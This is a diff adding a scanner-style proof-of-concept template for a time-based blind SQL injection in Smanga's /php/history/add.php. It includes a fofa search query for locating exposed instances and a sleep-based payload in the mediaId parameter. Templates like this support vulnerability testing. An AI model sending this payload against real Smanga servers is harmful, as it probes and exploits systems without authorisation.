@@ -1,0 +1,20 @@
+id: poc-yaml-smanga-add-php-sqli
+info:
+  name: Smanga add.php SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: smanga
+  fofa: body="smanga"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 1
+requests:
+- method: POST
+  path: /php/history/add.php
+  headers:
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+  data: chapterCover=1&chapterId=1&chapterName=1&chatpterPath=1&chaptertype=image&keyword=1&mangaCover=undefined&mangaId=1&mangaName=&mediaId=if(now()=sysdate()%2Csleep({{.t1}})%2C0)&timestamp=12123123&userId=1
+  expression: status_code == 200 && contains(body,`"code":0,"sqlRes":true`) && duration
+    >= t1 && duration < t2
+transport: http
